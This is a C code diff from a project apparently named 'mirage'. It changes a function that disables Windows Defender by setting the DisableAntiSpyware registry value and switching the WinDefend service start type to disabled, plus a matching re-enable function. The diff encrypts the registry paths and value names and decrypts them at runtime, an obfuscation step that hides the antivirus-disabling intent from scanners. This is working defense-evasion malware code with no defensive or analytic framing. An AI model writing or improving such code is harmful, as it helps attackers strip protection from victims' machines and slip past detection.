@@ -70,7 +70,7 @@ mirage_defender_result mirage_disable_defender(void) {
     HKEY hKey;
     LONG result;
 
-    /* Decrypt registry path: SOFTWARE\Policies\Microsoft\Windows Defender */
+    /* Decrypt registry path: SOFTWARE\Microsoft\Windows Defender */
     wchar_t wreg_def[128];
     enc_decrypt_wide(enc_wreg_defender, ENC_WREG_DEFENDER_LEN, wreg_def);
 
@@ -79,18 +79,23 @@ mirage_defender_result mirage_disable_defender(void) {
         wreg_def, 0, KEY_SET_VALUE, &hKey);
     if (result == ERROR_SUCCESS) {
         DWORD val = 1;
-        g_dd_api.pRegSetValueExW(hKey, L"DisableAntiSpyware", 0, REG_DWORD,
+        wchar_t val_name1[32];
+        enc_decrypt_wide(enc_wDisableAntiSpyware, ENC_WDISABLEANTISPYWARE_LEN, val_name1);
+        g_dd_api.pRegSetValueExW(hKey, val_name1, 0, REG_DWORD,
                                  (BYTE*)&val, sizeof(val));
         g_dd_api.pRegCloseKey(hKey);
     }
 
     /* Disable via services */
+    wchar_t svc_path[64];
+    enc_decrypt_wide(enc_wreg_windefend, ENC_WREG_WINDEFEND_LEN, svc_path);
     result = g_dd_api.pRegOpenKeyExW(HKEY_LOCAL_MACHINE,
-        L"SYSTEM\\CurrentControlSet\\Services\\WinDefend",
-        0, KEY_SET_VALUE, &hKey);
+        svc_path, 0, KEY_SET_VALUE, &hKey);
     if (result == ERROR_SUCCESS) {
         DWORD val = 4; /* SERVICE_DISABLED */
-        g_dd_api.pRegSetValueExW(hKey, L"Start", 0, REG_DWORD,
+        wchar_t val_name2[16];
+        enc_decrypt_wide(enc_wStart, ENC_WSTART_LEN, val_name2);
+        g_dd_api.pRegSetValueExW(hKey, val_name2, 0, REG_DWORD,
                                  (BYTE*)&val, sizeof(val));
         g_dd_api.pRegCloseKey(hKey);
     }
@@ -112,16 +117,21 @@ int mirage_defender_enable(void) {
     result = g_dd_api.pRegOpenKeyExW(HKEY_LOCAL_MACHINE,
         wreg_def, 0, KEY_SET_VALUE, &hKey);
     if (result == ERROR_SUCCESS) {
-        g_dd_api.pRegDeleteValueW(hKey, L"DisableAntiSpyware");
+        wchar_t val_name1[32];
+        enc_decrypt_wide(enc_wDisableAntiSpyware, ENC_WDISABLEANTISPYWARE_LEN, val_name1);
+        g_dd_api.pRegDeleteValueW(hKey, val_name1);
         g_dd_api.pRegCloseKey(hKey);
     }
 
+    wchar_t svc_path2[64];
+    enc_decrypt_wide(enc_wreg_windefend, ENC_WREG_WINDEFEND_LEN, svc_path2);
     result = g_dd_api.pRegOpenKeyExW(HKEY_LOCAL_MACHINE,
-        L"SYSTEM\\CurrentControlSet\\Services\\WinDefend",
-        0, KEY_SET_VALUE, &hKey);
+        svc_path2, 0, KEY_SET_VALUE, &hKey);
     if (result == ERROR_SUCCESS) {
         DWORD val = 2; /* SERVICE_AUTO_START */
-        g_dd_api.pRegSetValueExW(hKey, L"Start", 0, REG_DWORD,
+        wchar_t val_name2[16];
+        enc_decrypt_wide(enc_wStart, ENC_WSTART_LEN, val_name2);
+        g_dd_api.pRegSetValueExW(hKey, val_name2, 0, REG_DWORD,
                                  (BYTE*)&val, sizeof(val));
         g_dd_api.pRegCloseKey(hKey);
     }
